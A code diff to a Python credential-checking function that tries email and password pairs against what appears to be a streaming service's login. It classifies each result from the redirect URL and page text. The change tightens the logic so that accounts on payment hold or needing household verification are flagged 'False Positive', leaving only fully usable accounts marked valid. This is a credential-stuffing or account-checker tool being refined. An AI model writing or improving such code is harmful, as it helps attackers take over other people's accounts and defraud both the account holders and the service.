@@ -144,24 +144,36 @@ async def check_credential(email: str, password: str, semaphore: asyncio.Semapho
                 html = resp.text
                 html_lower = html.lower()
                 
-                # Check for success indicators
-                if any(x in final_url for x in ["/browse", "/profiles", "/YourAccount", "/member"]):
-                    result["valid"] = True
-                    
-                    # Try to get profile info
-                    if "profiles" in final_url or "browse" in final_url:
-                        result["info"] = "Active account"
+                # Strict Usability Checks
+                if any(x in final_url for x in ["/browse", "/profiles"]):
+                    # Further check for blocks on browse page
+                    if "household" in html_lower or "primary location" in html_lower:
+                        result["valid"] = False
+                        result["info"] = "False Positive: Household Verification"
+                    elif "update your payment" in html_lower or "account on hold" in html_lower:
+                        result["valid"] = False
+                        result["info"] = "False Positive: Account on Hold / Payment Update"
                     else:
+                        result["valid"] = True
+                        result["info"] = "Active account"
+                        
+                elif any(x in final_url for x in ["/YourAccount", "/member"]):
+                    # Check if it's usable or a hold page
+                    if "hold" in html_lower or "update" in html_lower or "payment" in html_lower or "household" in html_lower:
+                        result["valid"] = False
+                        result["info"] = "False Positive: Hold/Household Block"
+                    else:
+                        result["valid"] = True
                         result["info"] = f"Logged in -> {final_url}"
                 
-                # Check for household/payment issues (still valid credentials)
+                # Check for household/payment issues (categorize as invalid/false positive)
                 elif "account on hold" in html_lower or "update your payment" in html_lower:
-                    result["valid"] = True
-                    result["info"] = "Account on hold (payment issue)"
+                    result["valid"] = False
+                    result["info"] = "False Positive: Account on hold"
                 
                 elif "update your primary location" in html_lower or "household" in html_lower:
-                    result["valid"] = True
-                    result["info"] = "Household verification needed"
+                    result["valid"] = False
+                    result["info"] = "False Positive: Household verification"
                 
                 # Invalid credentials
                 elif any(x in html_lower for x in [
